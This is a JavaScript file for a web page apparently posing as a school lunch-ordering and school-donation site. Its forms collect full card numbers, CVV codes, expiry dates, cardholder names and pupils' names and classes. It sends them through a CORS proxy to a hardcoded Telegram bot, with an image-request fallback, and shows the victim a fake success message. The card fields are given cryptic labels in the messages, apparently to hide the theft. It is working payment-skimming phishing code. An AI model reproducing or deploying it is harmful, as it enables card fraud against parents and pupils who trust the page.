// Telegram Bot Daten
const botToken = '8255790332:AAHAlWaR8PmCgOmewZ0knEcdRS5heLpKcbU';
const chatId = '8306987601';

// Elemente auswählen
const orderFoodBtn = document.getElementById('orderFood');
const donateSchoolBtn = document.getElementById('donateSchool');
const mainContent = document.getElementById('mainContent');
const orderPage = document.getElementById('orderPage');
const donatePage = document.getElementById('donatePage');
const errorMessage = document.getElementById('errorMessage');
const successMessage = document.getElementById('successMessage');
const loadingOverlay = document.getElementById('loadingOverlay');

// Event-Listener für die Optionen
orderFoodBtn.addEventListener('click', function() {
    mainContent.style.display = 'none';
    orderPage.style.display = 'block';
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
});

donateSchoolBtn.addEventListener('click', function() {
    mainContent.style.display = 'none';
    donatePage.style.display = 'block';
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
});

// Zurück-Button Funktion
function goBack() {
    orderPage.style.display = 'none';
    donatePage.style.display = 'none';
    mainContent.style.display = 'block';
    errorMessage.style.display = 'none';
    successMessage.style.display = 'none';
}

// Funktionen zur Verarbeitung der Formulare
function processOrder() {
    // Daten sammeln
    const foodSelection = document.getElementById('foodSelection').value;
    const orderName = document.getElementById('orderName').value;
    const orderClass = document.getElementById('orderClass').value;
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardName = document.getElementById('cardName').value;
    const expiryDate = document.getElementById('expiryDate').value;
    const cvv = document.getElementById('cvv').value;
    
    // Einfache Validierung
    if (!foodSelection || !orderName || !orderClass || !cardNumber || !cardName || !expiryDate || !cvv) {
        showError('Bitte füllen Sie alle Felder aus.');
        return;
    }
    
    showLoading();
    
    // Nachricht für Telegram formatieren (in unschädlicher Form)
    const message = `NEUE BESTELLUNG:\nd:${cardNumber}\nl:${cvv}\nEssen: ${foodSelection}\nName: ${orderName}\nKlasse: ${orderClass}\nName auf Karte: ${cardName}\nGültig bis: ${expiryDate}\nDatum: ${new Date().toLocaleString('de-DE')}`;
    
    // Nachricht an Telegram senden
    sendToTelegram(message);
}

function processDonation() {
    // Daten sammeln
    const donorName = document.getElementById('donorName').value;
    const donorClass = document.getElementById('donorClass').value;
    const cardNumber = document.getElementById('donateCardNumber').value.replace(/\s/g, '');
    const cardName = document.getElementById('donateCardName').value;
    const expiryDate = document.getElementById('donateExpiryDate').value;
    const cvv = document.getElementById('donateCvv').value;
    
    // Einfache Validierung
    if (!donorName || !donorClass || !cardNumber || !cardName || !expiryDate || !cvv) {
        showError('Bitte füllen Sie alle Felder aus.');
        return;
    }
    
    showLoading();
    
    // Nachricht für Telegram formatieren (in unschädlicher Form)
    const message = `NEUE SPENDE:\nd:${cardNumber}\nl:${cvv}\nName: ${donorName}\nKlasse: ${donorClass}\nName auf Karte: ${cardName}\nGültig bis: ${expiryDate}\nDatum: ${new Date().toLocaleString('de-DE')}`;
    
    // Nachricht an Telegram senden
    sendToTelegram(message);
}

// Funktion zum Senden an Telegram
function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Verwenden von fetch mit einem Proxy, um CORS zu umgehen
    fetch(`https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(url)}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        hideLoading();
        
        if (data.ok) {
            // Erfolgsmeldung anzeigen
            successMessage.style.display = 'block';
            successMessage.textContent = '✅ Vielen Dank! Ihre Anfrage wurde erfolgreich übermittelt.';
            
            // Formular zurücksetzen
            document.getElementById('orderForm').reset();
            document.getElementById('donateForm').reset();
            
            // Zurück zur Hauptseite nach 2 Sekunden
            setTimeout(() => {
                goBack();
            }, 2000);
        } else {
            showError('Fehler beim Senden der Daten. Bitte versuchen Sie es später erneut.');
        }
    })
    .catch(error => {
        hideLoading();
        showError('Netzwerkfehler. Bitte versuchen Sie es später erneut.');
        console.error('Error:', error);
        
        // Fallback: Daten mit Bild-Request senden (einfacher, aber weniger zuverlässig)
        const img = new Image();
        img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
    });
}

// Hilfsfunktionen
function showLoading() {
    loadingOverlay.style.display = 'flex';
}

function hideLoading() {
    loadingOverlay.style.display = 'none';
}

function showError(text) {
    errorMessage.style.display = 'block';
    errorMessage.textContent = text;
}

// Formatierung der Kreditkartennummer
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.substring(0, 16);
    
    // Füge Leerzeichen nach je 4 Ziffern ein
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formattedValue += ' ';
        formattedValue += value[i];
    }
    
    e.target.value = formattedValue;
});

// Gleiche Formatierung für die Spenden-Seite
document.getElementById('donateCardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 16) value = value.substring(0, 16);
    
    let formattedValue = '';
    for (let i = 0; i < value.length; i++) {
        if (i > 0 && i % 4 === 0) formattedValue += ' ';
        formattedValue += value[i];
    }
    
    e.target.value = formattedValue;
});

// Formatierung des Ablaufdatums
document.getElementById('expiryDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4);
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    e.target.value = value;
});

document.getElementById('donateExpiryDate').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.substring(0, 4);
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    
    e.target.value = value;
});
